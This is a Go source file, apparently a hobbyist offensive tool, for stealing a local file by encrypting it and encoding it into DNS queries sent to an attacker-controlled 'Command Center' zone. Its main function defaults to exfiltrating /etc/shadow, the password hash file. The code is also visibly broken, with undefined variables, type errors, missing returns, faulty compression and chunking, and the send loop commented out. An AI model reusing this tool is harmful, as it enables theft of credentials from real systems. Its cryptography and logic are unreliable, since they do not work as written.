/*/

openssl rand -hex 32

It is the caller's responsibility to ensure the uniqueness of nonces—for
example, by using nonce 1 for the first message, nonce 2 for the second
message, etc. Nonces are long enough that randomly generated nonces have
negligible risk of collision.

Messages should be small because:
	1. The whole message needs to be held in memory to be processed.

	2. Using large messages pressures implementations on small machines to decrypt
		and process plaintext before authenticating it. This is very dangerous, and
		this API does not allow it, but a protocol that uses excessive message sizes
		might present some implementations with no other choice.

var	3. Fixed overheads will be sufficiently amortised by messages as small as 8KB.

	4. Performance may be improved by working with messages that fit into data caches.
		Thus large amounts of data should be chunked so that each message is small.
		(Each message still needs a unique nonce.) If in doubt, 16KB is a reasonable
		chunk size.
/*/

package dnsexfiltration

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"

	"github.com/kevinburke/nacl"
	"github.com/kevinburke/nacl/secretbox"
	log "github.com/sirupsen/logrus"

	"github.com/fatih/color"
	"github.com/miekg/dns"
	"golang.org/x/crypto/chacha20poly1305"
)

// bytes per read operation
var FILEREADSPEED int = 36
var MADEFOR string = "Church of the Subhacker"
var BANNERSTRING string = "====== mega impressive banner ======="

func StartLogger(logfile string) (return_code int) {
	Logs, derp := os.OpenFile(logfile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	LoggerInstance := log.New()
	Formatter := new(log.TextFormatter)
	Formatter.ForceColors = true
	Formatter.FullTimestamp = true
	Formatter.TimestampFormat = "02-01-2006 15:04:05"
	LoggerInstance.SetFormatter(Formatter)
	if derp != nil {
		// Cannot open log file. Logging to stderr
		ErrorPrinter(derp, "[-] ERROR: Failure To Open Logfile!", "warn")
		return 0
	} else {
		log.SetOutput(Logs)
	}
	return 1
}

// returns the errors but adds them to a log while printing a
// message to the screen for your viewing pleasure
// actions are :panic,alarm,exit,debug
func ErrorPrinter(derp error, message string, action string) error {
	switch action {
	case "panic":
		log.Panic()
		log.Error(message)
		//color.Red(message)
	case "warn":
		log.Warn()
	}
	log.Error(message)
	color.Red(message)
	return derp
}

// shows entries from the logfile, starting at the bottom
// limit by line number, loglevel, or time
func ShowLogs(LinesToPrint int, loglevel string, time string) {
	log.SetFormatter(&log.JSONFormatter{})
	//switch loglevel{
	//	case "error":
	//		log.ErrorLevel

}

// debugging feedback function
// prints colored text for easy visual identification of data
// color_int (1,red)(2,green)(3,blue)(4,yellow)
func Debug_print(color_int int8, message string) {
	//if color_int
	switch color_int {
	//is 1
	case 1:
		color.Red(message)
		// and so on
	case 2:
		color.Blue(message)
	case 3:
		color.Green(message)
	case 4:
		color.Yellow(message)
	}
}

// function to use zlib to compress a byte array
func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
	var b bytes.Buffer
	// feed the writer a buffer
	w := zlib.NewWriter(&b)
	// and the Write method will copy data to that buffer
	// in this case, the input we provide gets copied into the buffer "b"
	w.Write(input)
	// and then we close the connection
	w.Close()
	// and copy the buffer to the output
	//copy(herp, b.Bytes())
	return herp, derp
}

// compresses []byte with zlib
func ZDecompress(DataIn []byte) (DataOut []byte) {
	byte_reader := bytes.NewReader(DataIn)
	ZReader, derp := zlib.NewReader(byte_reader)
	if derp != nil {
		ErrorPrinter(derp, "generic error, fix me plz lol <3!", "panic")
	}
	copy(DataOut, DataIn)
	ZReader.Close()
	return DataOut
}

// opens files for reading and writing
func OpenFile(filename string) (filebytes []byte) {
	// open the file
	herp, derp := os.Open(filename)
	if derp != nil {
		ErrorPrinter(derp, "[-] Could not open File, exiting program", "fatal")
	}
	//
	defer func() {
		if derp = herp.Close(); derp != nil {
			ErrorPrinter(derp, "[-]io: file already closed", "warn")
		}
	}()
	// make io.reader and the buffer it will read into
	reader := bufio.NewReader(herp)
	buffer := make([]byte, FILEREADSPEED)
	for {
		// read INTO buffer
		// return bytes read as filebytes
		_, derp := reader.Read(buffer)
		if derp != nil {
			ErrorPrinter(derp, "[-] Could not read from file", "fatal")
			break
		}
		Debug_print(4, "[+] Bytes read:") //, filebytes)

	}
	return buffer
}

// This function creates a nonce with the bit size set
// by setting the chacha20poly1305.NonceSizeX variable
func NonceGenerator() (nonce []byte, derp error) {
	//var n *big.Int
	bitsize := big.NewInt(24)
	//nonce = make([]byte, 24)
	nonce = make([]byte, chacha20poly1305.NonceSizeX)
	// make random 24 bit prime number
	n, derp := rand.Int(rand.Reader, bitsize)
	if derp != nil {
		ErrorPrinter(derp, "[-] Failed to generate 64-bit Random Number", "fatal")
	}
	//copy number into buffer
	// after converting bigint to byte with internal method
	copy(nonce, n.Bytes())
	return nonce, derp
}

// makes chunky data for packet stuffing
// chunk size known, number of packets unknown
func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp error) {
	//var chunkcount int = 1
	var DataInLength = len(DataIn)
	// make the buffer
	DataOutBuffer := make([][]byte, DataInLength)
	// loop over the original data object taking a bite outta crim... uh data
	for asdf := 1; asdf < DataInLength; asdf += chunkSize { //chunkcount++{
		// mark the end bounds
		end := asdf + chunkSize
		// necessary check to avoid slicing beyond
		// slice capacity
		if end > DataInLength {
			end = DataInLength
		}
		DataOutBuffer = append(DataOutBuffer, DataIn[asdf:chunkSize])

	}

	return DataOutBuffer
	//maybe return chunk_num int as well
}

func ExampleNewGCMEncrypter() {
	// The key argument should be the AES key, either 16 or 32 bytes
	// to select AES-128 or AES-256.
	key := []byte("AES256Key-32Characters1234567890")
	plaintext := []byte("exampleplaintext")

	block, derp := aes.NewCipher(key)
	if derp != nil {
		panic(derp.Error())
	}

	// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
	nonce := make([]byte, 12)
	if _, derp := io.ReadFull(rand.Reader, nonce); derp != nil {
		panic(derp.Error())
	}

	aesgcm, derp := cipher.NewGCM(block)
	if derp != nil {
		panic(derp.Error())
	}

	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
	fmt.Printf("%x\n", ciphertext)
}

//AES-256-GCM
// defaults to : AES256Key-32Characters1234567890
func GCMDecrypter(key []byte, nonce string) {
	if key == nil {
		key = []byte("AES256Key-32Characters1234567890")
	}
	// The key argument should be the AES key, either 16 or 32 bytes
	// to select AES-128 or AES-256.
	//ciphertext, _ := hex.DecodeString("f90fbef747e7212ad7410d0eee2d965de7e890471695cddd2a5bc0ef5da1d04ad8147b62141ad6e4914aee8c512f64fba9037603d41de0d50b718bd665f019cdcd")
	//nonce, _ := hex.DecodeString("bb8ef84243d2ee95a41c6c57")

	block, derp := aes.NewCipher(key)
	if derp != nil {
		panic(derp.Error())
	}

	aesgcm, derp := cipher.NewGCM(block)
	if derp != nil {
		panic(derp.Error())
	}

	plaintext, derp := aesgcm.Open(nil, nonce, ciphertext, nil)
	if derp != nil {
		ErrorPrinter(derp, "generic error, fix me plz lol <3!", "panic")
	}

	fmt.Printf("%s\n", string(plaintext))
}

//uses NaCl library
func saltycrypt(keystring string, DataIn []byte) []byte {
	key, err := nacl.Load(keystring)
	if err != nil {
		panic(err)
	}
	encrypted := secretbox.EasySeal(DataIn, key)
	return encrypted
}

// decrypts with NaCl
func saltDEcrypt(keystring string, data []byte) []byte {
	key, err := nacl.Load(keystring)
	if err != nil {
		panic(err)
	}
	decrypted := secretbox.EasyOpen(data, key)
}

//decrypting with chacha20
func ChaChaHatesChaChi(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp []byte, derp error) {
	var key []byte
	DataOut := make([]byte, len(bytes_in))
	if derp != nil {
		ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	key = sha256.Sum256(EncryptionKey)
	herp, derp := chacha20poly1305.NewX(key)
	//nonce := make([]byte, chacha20poly1305.NonceSizeX)
	HaChaChaCha, _ := herp.Open(nil, nonce, HaChaChaCha, nil)

	copy(DataOut, HaChaChaCha)
	for _, element := range DataOut {
		// original code treated this like a nullbyte but wat?
		if element == 0 {
			ErrorPrinter(derp, "nullbyte?", "fatal")
			//return
		}
	}
	return DataOut, derp
}

// This function uses the ChaCha20 to encrypt a byte field
// with a variable sized nonce
func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp []byte, derp error) {
	var key [32]byte
	DataOut := make([]byte, len(bytes_in))
	if derp != nil {
		ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	key = sha256.Sum256(EncryptionKey)
	herp, derp := chacha20poly1305.NewX(key)
	//nonce := make([]byte, chacha20poly1305.NonceSizeX)

	HaChaChaCha := herp.Seal(nil, nonce, bytes_in, nil)

	//plaintext, _ := herp.Open(nil, nonce, HaChaChaCha, nil)

	copy(DataOut, HaChaChaCha)
	for _, element := range DataOut {
		// original code treated this like a nullbyte but wat?
		if element == 0 {
			ErrorPrinter(derp, "generic error, fix me plz lol <3!")
			//return
		}
	}
	return DataOut, derp
}
func cheatercheaterskideater() {
	key, derp := nacl.Load(ENCRYPTIONKEY)
	if derp != nil {
		panic(derp)
	}
	encrypted := secretbox.EasySeal([]byte("hello world"), key)
}

func sendDNSmessage(MsgAsHexStr string, DestZone string) {
	var debug bool = true
	//a unique marker to identify the file in the dns logs
	//var marker string = "herpAderpNotAPerp"
	// the dns zone to send the queries to.
	hostname := fmt.Sprintf("%d.%s.1.%s.%s", marker, MsgAsHexStr, DestZone)
	herp, derp := net.LookupIP(hostname)
	fmt.Printf("%d\n", chunk)
	if debug {
		fmt.Printf("Data Length: %d\n")
		fmt.Printf("Error: %s\n", derp)
		fmt.Printf("--------------------------\n")
	}

}
func DnsReceiver() {
	dns.Server.Listener()
}

// main function
// Exports a sequence of bytes via DNS packets
// max message size is 512 bytes
func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (herp, derp error) {
	//var debug bool = true
	MaxMsgSize = 512 // bytes
	//chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)

	//for thing in chunksofdata {
	//	hexString := hex.EncodeToString(dataBytes)
	//	sendDNSmessage(hexString, DestZone)
	//}

}

// only used for parsing arguments
func main() {
	var debug = flag.Bool("d", false, "enable debugging.")
	var file = flag.String("file", "/etc/shadow", "the local file to exfiltrate.")
	var logfile = flag.String("logfile", "ugotmaybepwned", "logfile")
	var help = flag.Bool("help", false, "show help.")
	var DerpKey = flag.String("key", "Herp-Key-Derp", "Encryption Key")
	var EncryptionType = flag.String("Encryption Type", "aes256gcm", "Can be: aes256gcm / salty / chacha / salsa ")
	var CommandCenter = flag.String("Command Center", "hakcbiscuits.netyinski", "the dns zone (homebase) to send the queries to.")

	flag.Parse()

	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}
	fileobject := OpenFile(*file)
	ENCRYPTIONKEY := hex.EncodeToString(DerpKey)
	DNSExfiltration(fileobject, *CommandCenter, 512)
}
